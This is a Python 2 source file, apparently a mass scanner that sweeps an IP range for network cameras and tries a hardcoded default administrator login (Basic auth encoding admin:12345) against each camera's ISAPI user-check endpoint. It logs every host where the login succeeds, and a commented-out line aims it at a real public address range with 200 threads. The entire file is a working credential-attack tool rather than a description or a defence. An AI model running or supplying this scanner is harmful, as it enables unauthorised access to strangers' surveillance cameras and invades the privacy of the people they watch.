# -*- coding:utf-8 -*-
from gevent import monkey; monkey.patch_all();  
import socket  
from gevent.pool import Pool  
import requests
import os
import threading
import socket
import time
import datetime
import logging 
import fire
import gc

class parse_ip():

	def __init__(self, start_ip, end_ip):
		self.start_ip = start_ip
		self.end_ip = end_ip
		self.base = [str(x) for x in range(10)] + [ chr(x) for x in range(ord('A'),ord('A')+6)]
		self.num = 0

	#十进制0~255转化为二进制,补0到8位
	def __dec2bin80(self, string_num):
		num = int(string_num)
		mid = []
		while True:
			if num == 0: break
			num,rem = divmod(num, 2)
			mid.append(self.base[rem])

		result = ''.join([str(x) for x in mid[::-1]])
		length = len(result)
		if length < 8:
			result = '0' * (8 - length) + result
		return result


	#十进制0~255转化为二进制,补0到32位
	def __dec2bin320(self, string_num):
		num = int(string_num)
		mid = []
		while True:
			if num == 0: break
			num,rem = divmod(num, 2)
			mid.append(self.base[rem])

		result = ''.join([str(x) for x in mid[::-1]])
		length = len(result)
		if length < 32:
			result = '0' * (32 - length) + result
		return result


	#十进制0~255转化为二进制，不补零
	def __dec2bin(self, string_num):
		num = int(string_num)
		mid = []
		while True:
			if num == 0: break
			num,rem = divmod(num, 2)
			mid.append(self.base[rem])

		return ''.join([str(x) for x in mid[::-1]])


	#二进制转换为十进制
	def __bin2dec(self, string_num):
		return str(int(string_num, 2))

	#ip列表生成
	def iplist(self):
		string_startip = self.start_ip
		string_endip = self.end_ip
		#分割IP，然后将其转化为8位的二进制代码
		start = string_startip.split('.')
		start_a = self.__dec2bin80(start[0])
		start_b = self.__dec2bin80(start[1])
		start_c = self.__dec2bin80(start[2])
		start_d = self.__dec2bin80(start[3])
		start_bin = start_a + start_b + start_c + start_d
		#将二进制代码转化为十进制
		start_dec = self.__bin2dec(start_bin)

		end = string_endip.split('.')
		end_a = self.__dec2bin80(end[0])
		end_b = self.__dec2bin80(end[1])
		end_c = self.__dec2bin80(end[2])
		end_d = self.__dec2bin80(end[3])
		end_bin = end_a + end_b + end_c + end_d
		#将二进制代码转化为十进制
		end_dec = self.__bin2dec(end_bin)

		#十进制相减，获取两个IP之间有多少个IP
		count = int(end_dec) - int(start_dec)

		#生成IP列表
		for i in xrange(0,count + 1):
			#将十进制IP加一，再转化为二进制（32位补齐）
			plusone_dec = int(start_dec) + i
			plusone_dec = str(plusone_dec)
			address_bin = self.__dec2bin320(plusone_dec)
			#分割IP，转化为十进制
			address_a = self.__bin2dec(address_bin[0:8])
			address_b = self.__bin2dec(address_bin[8:16])
			address_c = self.__bin2dec(address_bin[16:24])
			address_d = self.__bin2dec(address_bin[24:32])
			address = address_a + '.'+ address_b +'.'+ address_c +'.'+ address_d
			yield address
			#self.num = self.num + 1


class scan_camera():
	#initial the configuration
	def __init__(self, start_ip, end_ip, port=81, thread_num=20):
		self.start_ip = start_ip
		self.end_ip = end_ip
		self.port = port 
		self.thread_num = thread_num
		logging.basicConfig(level=logging.CRITICAL,
				format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',
				datefmt='%a, %d %b %Y %H:%M:%S',
				filename='myapp.log',
				filemode='a+')

	def __scan(self, ip):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
		s.settimeout(1)
		try:
			result = s.connect_ex((ip, self.port))
			if result == 0:
				print ip, "PORT ", self.port, " is on"
				self.__exploit(ip)
			else:
				#print ip, "PORT ", self.port, " is off"
				pass
			s.close()
		except socket.error as e:
			s.close()
			print e
		#release the memory
		gc.collect()


	def __exploit(self, ip):
		url = 'http://' + ip + ':' + str(self.port)
		userpwd = 'Basic YWRtaW46MTIzNDU=' 
		headers = {
			'X-Requested-With': 'XMLHttpRequest',
			'Refer': url + '/doc/page/login.asp',
			'If-Modified-Since': "0",
			"Authorization": userpwd
		}
		try:
			r = requests.get(url=url + '/ISAPI/Security/userCheck', headers=headers, timeout=5)
			if r.status_code == 200 and r.text.find('OK') != -1:
				logging.critical('%s : succeed' % ip)
				return True
			else:
				return False

		except Exception, e:
			return False
		#release the memory
		gc.collect()

	def run(self):
		starttime = datetime.datetime.now()
		pool = Pool(int(self.thread_num))  
		ip = parse_ip(self.start_ip, self.end_ip)
		pool.map(self.__scan, ip.iplist())
		pool.join() 
		endtime = datetime.datetime.now()
		logging.critical('total_time: %s' % (endtime - starttime).seconds)
		logging.critical('total_num: %s' % ip.num)

def execute():
	gc.enable()
	#gc.set_debug(gc.DEBUG_UNCOLLECTABLE)
	
	#print "begin leak test..."
	fire.Fire(scan_camera)
	gc.collect()
	#print "\nbegin collect..."
	#_unreachable = gc.collect()
	#print "unreachable object num:%d" %(_unreachable)
	#print "garbage object num:%d" %(len(gc.garbage))	
	
if __name__ == '__main__':
	#test = scan_camera('106.14.144.0', '106.14.145.255', port=80, thread_num=200)
	#test.run()
	execute()